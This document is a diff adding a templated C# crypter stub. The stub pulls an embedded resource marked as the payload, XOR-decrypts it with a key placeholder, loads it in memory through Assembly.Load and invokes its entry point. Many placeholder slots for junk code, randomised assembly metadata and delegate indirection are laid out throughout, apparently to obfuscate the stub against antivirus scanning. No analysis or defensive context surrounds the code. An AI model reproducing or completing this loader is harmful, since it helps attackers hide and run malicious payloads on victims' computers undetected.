@@ -1,0 +1,443 @@
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Management;
+using System.Collections.Generic;
+using Microsoft.Win32;
+using System.Security.Cryptography;
+using System.Reflection;
+
+
+#if %%%RandomAssembly%%%
+[assembly: AssemblyTitle("%$#@basictrigger0@#$%")]
+[assembly: AssemblyVersion("%$#@assemblytrigger0@#$%")]
+[assembly: AssemblyFileVersion("%$#@assemblytrigger1@#$%")]
+[assembly: AssemblyDescription("%$#@basictrigger1@#$%")]
+[assembly: AssemblyCompany("%$#@basictrigger2@#$%")]
+[assembly: AssemblyProduct("%$#@basictrigger3@#$%")]
+#else
+#if %%%Title%%%
+[assembly: AssemblyTitle("%%%AssemblyTitle%%%")]
+#endif
+#if %%%Version%%%
+[assembly: AssemblyVersion("%%%AssemblyVersion%%%")]
+#endif
+#if %%%FileVersion%%%
+[assembly: AssemblyFileVersion("%%%AssemblyFileVersion%%%")]
+#endif
+#if %%%Description%%%
+[assembly: AssemblyDescription("%%%AssemblyDescription%%%")]
+#endif
+#if %%%Company%%%
+[assembly: AssemblyCompany("%%%AssemblyCompany%%%")]
+#endif
+#if %%%Product%%%
+[assembly: AssemblyProduct("%%%AssemblyProduct%%%")]
+#endif
+#endif
+
+#pragma warning disable 0169
+#pragma warning disable 0649
+
+%$#@namespacetrigger0@#$%
+%$#@namespacetrigger1@#$%
+%$#@namespacetrigger2@#$%
+%$#@namespacetrigger3@#$%
+%$#@namespacetrigger4@#$%
+%$#@namespacetrigger5@#$%
+%$#@namespacetrigger6@#$%
+
+namespace %$#@basictriggerN0@#$%
+{
+    %$#@classtrigger0@#$%
+    %$#@classtrigger1@#$%
+	%$#@classtrigger2@#$%
+	%$#@classtrigger3@#$%
+	%$#@classtrigger4@#$%
+	%$#@classtrigger5@#$%
+    %$#@classtrigger6@#$%
+    %$#@classtrigger7@#$%
+	%$#@classtrigger8@#$%
+	%$#@classtrigger9@#$%
+	%$#@classtrigger10@#$%
+	%$#@classtrigger11@#$%
+    static class %$#@basictriggerProgram@#$%
+    {
+		%$#@betweentrigger0000@#$%
+		%$#@betweentrigger0001@#$%
+		%$#@betweentrigger0002@#$%
+		%$#@betweentrigger00042_as_f@#$%
+		%$#@betweentrigger00043_as_f@#$%
+		%$#@betweentrigger00044_as_f@#$%
+		public delegate void %$#@basictriggerEntryPointInvoke@#$%(object %$#@basictriggeri0cc@#$%,object[] %$#@basictriggeri1cc@#$%);
+		%$#@betweentrigger00@#$%
+		%$#@betweentrigger01@#$%
+		%$#@betweentrigger02@#$%
+		%$#@betweentrigger042_as_f@#$%
+		%$#@betweentrigger043_as_f@#$%
+		%$#@betweentrigger044_as_f@#$%
+		public delegate Assembly %$#@basictriggerAssemblyLoad@#$%(byte[] %$#@basictriggerinb@#$%);
+		%$#@betweentrigger000@#$%
+		%$#@betweentrigger001@#$%
+		%$#@betweentrigger002@#$%
+		%$#@betweentrigger0042_as_f@#$%
+		%$#@betweentrigger0043_as_f@#$%
+		%$#@betweentrigger0044_as_f@#$%
+        public static %$#@basictriggerAssemblyLoad@#$% %$#@basictriggerAssemblyLoadX@#$% = Assembly.Load;
+		%$#@betweentrigger0@#$%
+		%$#@betweentrigger1@#$%
+		%$#@betweentrigger2@#$%
+		%$#@betweentrigger42_as_f@#$%
+		%$#@betweentrigger43_as_f@#$%
+		%$#@betweentrigger44_as_f@#$%
+		public delegate object %$#@basictriggerVoidInvoke@#$%(object %$#@basictriggeriny@#$%,object[] %$#@basictriggerinz@#$%);
+		%$#@betweentrigger48gh@#$%
+		%$#@betweentrigger49gh@#$%
+		%$#@betweentrigger50gh@#$%
+		%$#@betweentrigger45_as_f@#$%
+		%$#@betweentrigger46_as_f@#$%
+		%$#@betweentrigger47_as_f@#$%
+		public static %$#@basictriggerVoidInvoke@#$% %$#@basictriggerVoidInvokeObj@#$%;
+		%$#@betweentrigger51gh@#$%
+		%$#@betweentrigger52gh@#$%
+		%$#@betweentrigger53gh@#$%
+		%$#@betweentrigger12@#$%
+		%$#@betweentrigger13@#$%
+		%$#@betweentrigger14@#$%
+        static string %$#@basictrigger8@#$% = "%key%";
+		%$#@betweentrigger15@#$%
+		%$#@betweentrigger16@#$%
+		%$#@betweentrigger17@#$%
+
+
+		%$#@betweentrigger18@#$%
+		%$#@betweentrigger19@#$%
+		%$#@betweentrigger20@#$%
+		%$#@betweentrigger21@#$%
+		%$#@betweentrigger22@#$%
+		%$#@betweentrigger23@#$%
+
+        private static int[] %$#@basictriggerBytesDivider@#$% = %%%arrayreverted%%% ;
+		%$#@betweentrigger0_as_f@#$%
+		%$#@betweentrigger1_as_f@#$%
+		%$#@betweentrigger2_as_f@#$%
+		%$#@betweentrigger3_as_f@#$%
+		%$#@betweentrigger4_as_f@#$%
+		%$#@betweentrigger5_as_f@#$%
+        private static int %$#@basictriggerDeepFractal@#$%=%$#@basictriggerBytesDivider@#$%.Length;
+		%$#@betweentrigger6_as_f@#$%
+		%$#@betweentrigger7_as_f@#$%
+		%$#@betweentrigger8_as_f@#$%
+		%$#@betweentrigger9_as_f@#$%
+		%$#@betweentrigger10_as_f@#$%
+		%$#@betweentrigger11_as_f@#$%
+
+        public delegate byte[] %$#@basictriggerGetBytes_s@#$%(string %$#@basictriggerGetBytes_S0@#$%);
+		%$#@betweentrigger12_as_f@#$%
+		%$#@betweentrigger13_as_f@#$%
+		%$#@betweentrigger14_as_f@#$%
+		%$#@betweentrigger15_as_f@#$%
+		%$#@betweentrigger16_as_f@#$%
+		%$#@betweentrigger17_as_f@#$%
+		public static readonly %$#@basictriggerGetBytes_s@#$% %$#@basictriggerGetBytes_V@#$%=Encoding.UTF8.GetBytes;
+		%$#@betweentrigger18_as_f@#$%
+		%$#@betweentrigger19_as_f@#$%
+		%$#@betweentrigger20_as_f@#$%
+		%$#@betweentrigger21_as_f@#$%
+		%$#@betweentrigger22_as_f@#$%
+		%$#@betweentrigger23_as_f@#$%
+        public delegate Assembly %$#@basictriggerAssemblyT_D@#$%();
+		%$#@betweentrigger24_as_f@#$%
+		%$#@betweentrigger25_as_f@#$%
+		%$#@betweentrigger26_as_f@#$%
+		%$#@betweentrigger27_as_f@#$%
+		%$#@betweentrigger28_as_f@#$%
+		%$#@betweentrigger29_as_f@#$%
+        public static readonly %$#@basictriggerAssemblyT_D@#$% %$#@basictriggerAssemblyT_V@#$% = Assembly.GetExecutingAssembly;
+		%$#@betweentrigger30_as_f@#$%
+		%$#@betweentrigger31_as_f@#$%
+		%$#@betweentrigger32_as_f@#$%
+		%$#@betweentrigger33_as_f@#$%
+		%$#@betweentrigger34_as_f@#$%
+		%$#@betweentrigger35_as_f@#$%
+        public delegate Process %$#@basictriggerProcessT_D@#$%();
+		%$#@betweentrigger36_as_f@#$%
+		%$#@betweentrigger37_as_f@#$%
+		%$#@betweentrigger38_as_f@#$%
+		%$#@betweentrigger39_as_f@#$%
+		%$#@betweentrigger40_as_f@#$%
+		%$#@betweentrigger41_as_f@#$%
+
+
+
+
+        private static byte[] %$#@basictrigger157@#$%(byte[] %$#@basictriggerDECRYPT_0@#$%)
+        {
+			%$#@additionaltrigger0_ass_f@#$%
+		    %$#@additionaltrigger1_ass_f@#$%
+		    %$#@additionaltrigger2_ass_f@#$%
+            byte[] %$#@basictriggerDECRYPT_3@#$% = %$#@basictriggerDECRYPT_0@#$%;
+			%$#@additionaltrigger3_ass_f@#$%
+		    %$#@additionaltrigger4_ass_f@#$%
+		    %$#@additionaltrigger5_ass_f@#$%
+            byte[] %$#@basictriggerDECRYPT_1@#$% = %$#@basictriggerGetBytes_V@#$%(%$#@basictrigger8@#$%);
+			%$#@additionaltrigger6_ass_f@#$%
+		    %$#@additionaltrigger7_ass_f@#$%
+		    %$#@additionaltrigger8_ass_f@#$%
+            byte[] %$#@basictriggerDECRYPT_2@#$% = new byte[%$#@basictriggerDECRYPT_1@#$%.Length];
+			%$#@additionaltrigger9_ass_f@#$%
+		    %$#@additionaltrigger10_ass_f@#$%
+		    %$#@additionaltrigger11_ass_f@#$%
+            byte[] %$#@basictriggerDECRYPT_4@#$% = new byte[%$#@basictriggerDECRYPT_1@#$%.Length];
+			%$#@additionaltrigger12_ass_f@#$%
+		    %$#@additionaltrigger13_ass_f@#$%
+		    %$#@additionaltrigger14_ass_f@#$%
+
+            double %$#@basictriggerDECRYPT_5@#$%;
+			%$#@additionaltrigger15_ass_f@#$%
+		    %$#@additionaltrigger16_ass_f@#$%
+		    %$#@additionaltrigger17_ass_f@#$%
+            int %$#@basictriggerDECRYPT_6@#$%;
+			%$#@additionaltrigger18_ass_f@#$%
+		    %$#@additionaltrigger19_ass_f@#$%
+		    %$#@additionaltrigger20_ass_f@#$%
+            int %$#@basictriggerDECRYPT_7@#$%;
+			%$#@additionaltrigger21_ass_f@#$%
+		    %$#@additionaltrigger22_ass_f@#$%
+		    %$#@additionaltrigger23_ass_f@#$%
+            int %$#@basictriggerDECRYPT_8@#$%;
+			%$#@additionaltrigger24_ass_f@#$%
+		    %$#@additionaltrigger25_ass_f@#$%
+		    %$#@additionaltrigger26_ass_f@#$%
+
+            for (int i = 0; i < %$#@basictriggerDeepFractal@#$%; ++i)
+            {
+				%$#@additionaltrigger27_ass_f@#$%
+		        %$#@additionaltrigger28_ass_f@#$%
+		        %$#@additionaltrigger29_ass_f@#$%
+                %$#@basictriggerDECRYPT_5@#$% = (double)(%$#@basictriggerDECRYPT_3@#$%.Length - %$#@basictriggerBytesDivider@#$%[i]) % (double)(%$#@basictriggerBytesDivider@#$%[i] + %$#@basictriggerDECRYPT_1@#$%.Length);
+				%$#@additionaltrigger30_ass_f@#$%
+		        %$#@additionaltrigger31_ass_f@#$%
+		        %$#@additionaltrigger32_ass_f@#$%
+                %$#@basictriggerDECRYPT_6@#$% = (int)((double)(%$#@basictriggerDECRYPT_3@#$%.Length- %$#@basictriggerBytesDivider@#$%[i]) / (double)(%$#@basictriggerBytesDivider@#$%[i] + %$#@basictriggerDECRYPT_1@#$%.Length));
+				%$#@additionaltrigger33_ass_f@#$%
+		        %$#@additionaltrigger34_ass_f@#$%
+		        %$#@additionaltrigger35_ass_f@#$%
+                if ( %$#@basictriggerDECRYPT_5@#$% != 0 )
+                {
+				    %$#@additionaltrigger36_ass_f@#$%
+		            %$#@additionaltrigger37_ass_f@#$%
+		            %$#@additionaltrigger38_ass_f@#$%
+                    %$#@basictriggerDECRYPT_7@#$% = %$#@basictriggerDECRYPT_6@#$%;
+				    %$#@additionaltrigger39_ass_f@#$%
+		            %$#@additionaltrigger40_ass_f@#$%
+		            %$#@additionaltrigger41_ass_f@#$%
+                }
+                else
+                {
+				    %$#@additionaltrigger42_ass_f@#$%
+		            %$#@additionaltrigger43_ass_f@#$%
+		            %$#@additionaltrigger44_ass_f@#$%
+                    %$#@basictriggerDECRYPT_7@#$% = %$#@basictriggerDECRYPT_6@#$%-1;
+				    %$#@additionaltrigger45_ass_f@#$%
+		            %$#@additionaltrigger46_ass_f@#$%
+		            %$#@additionaltrigger47_ass_f@#$%
+                }
+
+				%$#@additionaltrigger48_ass_f@#$%
+		        %$#@additionaltrigger49_ass_f@#$%
+		        %$#@additionaltrigger50_ass_f@#$%
+                %$#@basictriggerDECRYPT_8@#$% = 0;
+				%$#@additionaltrigger51_ass_f@#$%
+		        %$#@additionaltrigger52_ass_f@#$%
+		        %$#@additionaltrigger53_ass_f@#$%
+
+                while ( %$#@basictriggerDECRYPT_8@#$% <= %$#@basictriggerDECRYPT_7@#$% )
+                {
+				    %$#@additionaltrigger54_ass_f@#$%
+		            %$#@additionaltrigger55_ass_f@#$%
+		            %$#@additionaltrigger56_ass_f@#$%
+                    int %$#@basictriggerDECRYPT_9@#$% = %$#@basictriggerBytesDivider@#$%[i] + ((%$#@basictriggerBytesDivider@#$%[i] + %$#@basictriggerDECRYPT_1@#$%.Length) * %$#@basictriggerDECRYPT_8@#$%);
+				    %$#@additionaltrigger57_ass_f@#$%
+		            %$#@additionaltrigger58_ass_f@#$%
+		            %$#@additionaltrigger59_ass_f@#$%
+                    int %$#@basictriggerDECRYPT_10@#$% = %$#@basictriggerBytesDivider@#$%[i] + ((%$#@basictriggerBytesDivider@#$%[i] + %$#@basictriggerDECRYPT_1@#$%.Length) * %$#@basictriggerDECRYPT_8@#$%) + %$#@basictriggerDECRYPT_1@#$%.Length;
+				    %$#@additionaltrigger60_ass_f@#$%
+		            %$#@additionaltrigger61_ass_f@#$%
+		            %$#@additionaltrigger62_ass_f@#$%
+                    if ( %$#@basictriggerDECRYPT_9@#$% >= %$#@basictriggerDECRYPT_3@#$%.Length )
+                    {
+				        %$#@additionaltrigger63_ass_f@#$%
+		                %$#@additionaltrigger64_ass_f@#$%
+		                %$#@additionaltrigger65_ass_f@#$%
+                        break;
+                    }
+				    %$#@additionaltrigger81_ass_f@#$%
+		            %$#@additionaltrigger82_ass_f@#$%
+		            %$#@additionaltrigger83_ass_f@#$%
+                    if ( %$#@basictriggerDECRYPT_10@#$% > %$#@basictriggerDECRYPT_3@#$%.Length )
+                    {
+				        %$#@additionaltrigger66_ass_f@#$%
+		                %$#@additionaltrigger67_ass_f@#$%
+		                %$#@additionaltrigger68_ass_f@#$%
+                        %$#@basictriggerDECRYPT_10@#$% = %$#@basictriggerDECRYPT_3@#$%.Length;
+				        %$#@additionaltrigger69_ass_f@#$%
+		                %$#@additionaltrigger70_ass_f@#$%
+		                %$#@additionaltrigger71_ass_f@#$%
+                    }
+				    %$#@additionaltrigger84_ass_f@#$%
+		            %$#@additionaltrigger85_ass_f@#$%
+		            %$#@additionaltrigger86_ass_f@#$%
+                    for (int k = %$#@basictriggerDECRYPT_9@#$%; k < %$#@basictriggerDECRYPT_10@#$%; ++k)
+                    {
+				        %$#@additionaltrigger72_ass_f@#$%
+		                %$#@additionaltrigger73_ass_f@#$%
+		                %$#@additionaltrigger74_ass_f@#$%
+                        %$#@basictriggerDECRYPT_2@#$%[k-%$#@basictriggerDECRYPT_9@#$%] = %$#@basictriggerDECRYPT_3@#$%[k];
+				        %$#@additionaltrigger75_ass_f@#$%
+		                %$#@additionaltrigger76_ass_f@#$%
+		                %$#@additionaltrigger77_ass_f@#$%
+                        %$#@basictriggerDECRYPT_4@#$%[k- %$#@basictriggerDECRYPT_9@#$%] = (byte)(%$#@basictriggerDECRYPT_2@#$%[k - %$#@basictriggerDECRYPT_9@#$%] ^ %$#@basictriggerDECRYPT_1@#$%[k - %$#@basictriggerDECRYPT_9@#$%]);
+				        %$#@additionaltrigger78_ass_f@#$%
+		                %$#@additionaltrigger79_ass_f@#$%
+		                %$#@additionaltrigger80_ass_f@#$%
+                    }
+				    %$#@additionaltrigger87_ass_f@#$%
+		            %$#@additionaltrigger88_ass_f@#$%
+		            %$#@additionaltrigger89_ass_f@#$%
+                    for (int k = %$#@basictriggerDECRYPT_9@#$%; k < %$#@basictriggerDECRYPT_10@#$%; ++k)
+                    {
+				        %$#@additionaltrigger90_ass_f@#$%
+		                %$#@additionaltrigger91_ass_f@#$%
+		                %$#@additionaltrigger92_ass_f@#$%
+                        %$#@basictriggerDECRYPT_3@#$%[k] = %$#@basictriggerDECRYPT_4@#$%[k- %$#@basictriggerDECRYPT_9@#$%];
+				        %$#@additionaltrigger93_ass_f@#$%
+		                %$#@additionaltrigger94_ass_f@#$%
+		                %$#@additionaltrigger95_ass_f@#$%
+                    }
+				    %$#@additionaltrigger96_ass_f@#$%
+		            %$#@additionaltrigger97_ass_f@#$%
+		            %$#@additionaltrigger98_ass_f@#$%
+                    %$#@basictriggerDECRYPT_8@#$%++;
+				    %$#@additionaltrigger99_ass_f@#$%
+		            %$#@additionaltrigger100_ass_f@#$%
+		            %$#@additionaltrigger101_ass_f@#$%
+                }
+				%$#@additionaltrigger102_ass_f@#$%
+		        %$#@additionaltrigger103_ass_f@#$%
+		        %$#@additionaltrigger104_ass_f@#$%
+
+            }
+			%$#@additionaltrigger105_ass_f@#$%
+		    %$#@additionaltrigger106_ass_f@#$%
+		    %$#@additionaltrigger107_ass_f@#$%
+            
+            return %$#@basictriggerDECRYPT_3@#$%;
+        }
+
+		%$#@betweentrigger24@#$%
+		%$#@betweentrigger25@#$%
+		%$#@betweentrigger26@#$%
+		%$#@betweentrigger27@#$%
+		%$#@betweentrigger28@#$%
+		%$#@betweentrigger29@#$%
+
+
+        public static byte[] %$#@basictrigger24@#$%(String %$#@basictrigger25@#$%)
+        {
+			%$#@additionaltriggerF63@#$%
+		    %$#@additionaltriggerF64@#$%
+		    %$#@additionaltriggerF65@#$%
+            Assembly %$#@basictrigger28@#$% = %$#@basictriggerAssemblyT_V@#$%();
+			%$#@additionaltriggerF66@#$%
+		    %$#@additionaltriggerF67@#$%
+		    %$#@additionaltriggerF68@#$%
+            using (Stream %$#@basictrigger26@#$% = %$#@basictrigger28@#$%.GetManifestResourceStream(%$#@basictrigger25@#$%))
+            {
+				%$#@additionaltriggerF69@#$%
+		        %$#@additionaltriggerF70@#$%
+		        %$#@additionaltriggerF71@#$%
+                if (%$#@basictrigger26@#$% == null) return null;
+				%$#@additionaltriggerF72@#$%
+		        %$#@additionaltriggerF73@#$%
+		        %$#@additionaltriggerF74@#$%
+                byte[] %$#@basictrigger27@#$% = new byte[%$#@basictrigger26@#$%.Length];
+				%$#@additionaltriggerF75@#$%
+		        %$#@additionaltriggerF76@#$%
+		        %$#@additionaltriggerF77@#$%
+                %$#@basictrigger26@#$%.Read(%$#@basictrigger27@#$%, 0, %$#@basictrigger27@#$%.Length);
+				%$#@additionaltriggerF78@#$%
+		        %$#@additionaltriggerF79@#$%
+		        %$#@additionaltriggerF80@#$%
+                return %$#@basictrigger27@#$%;
+            }
+        }
+
+		%$#@betweentrigger36@#$%
+		%$#@betweentrigger37@#$%
+		%$#@betweentrigger38@#$%
+		%$#@betweentrigger39@#$%
+		%$#@betweentrigger40@#$%
+		%$#@betweentrigger41@#$%
+
+		static void %$#@basictriggerRunAssembly@#$%()
+		{
+			%$#@additionaltriggerF0@#$%
+		    %$#@additionaltriggerF1@#$%
+		    %$#@additionaltriggerF2@#$%
+		    %$#@additionaltriggerF7@#$%
+            Assembly %$#@basictriggerexeAssembly@#$% = %$#@basictriggerAssemblyLoadX@#$%( %$#@basictrigger157@#$%(%$#@basictrigger24@#$%("%%%payload%%%")) ) ;
+			%$#@additionaltriggerF3@#$%
+		    %$#@additionaltriggerF4@#$%
+		    %$#@additionaltriggerF5@#$%
+		    %$#@additionaltriggerF8@#$%
+			%$#@basictriggerexeAssembly@#$%.EntryPoint.Invoke(null, null); //no parameters	
+			%$#@additionaltriggerF9@#$%
+		    %$#@additionaltriggerF10@#$%
+		    %$#@additionaltriggerF11@#$%
+			%$#@additionaltriggerF6@#$%
+
+		}
+
+		%$#@betweentrigger42@#$%
+		%$#@betweentrigger43@#$%
+		%$#@betweentrigger44@#$%
+		%$#@betweentrigger45@#$%
+		%$#@betweentrigger46@#$%
+		%$#@betweentrigger47@#$%
+
+        [STAThread]
+        static void Main()
+        {
+			%$#@additionaltriggerF120@#$%
+		    %$#@additionaltriggerF121@#$%
+		    %$#@additionaltriggerF122@#$%
+            %$#@basictriggerRunAssembly@#$%();
+			%$#@additionaltriggerF147@#$%
+		    %$#@additionaltriggerF148@#$%
+		    %$#@additionaltriggerF149@#$%
+        }
+    }
+    %$#@classtrigger0e@#$%
+    %$#@classtrigger1e@#$%
+	%$#@classtrigger2e@#$%
+	%$#@classtrigger3e@#$%
+	%$#@classtrigger4e@#$%
+	%$#@classtrigger5e@#$%
+    %$#@classtrigger6e@#$%
+    %$#@classtrigger7e@#$%
+	%$#@classtrigger8e@#$%
+	%$#@classtrigger9e@#$%
+	%$#@classtrigger10e@#$%
+	%$#@classtrigger11e@#$%
+}
+
+%$#@namespacetrigger7@#$%
+%$#@namespacetrigger8@#$%
+%$#@namespacetrigger9@#$%
+%$#@namespacetrigger10@#$%
+%$#@namespacetrigger11@#$%
+%$#@namespacetrigger12@#$%
+%$#@namespacetrigger13@#$%
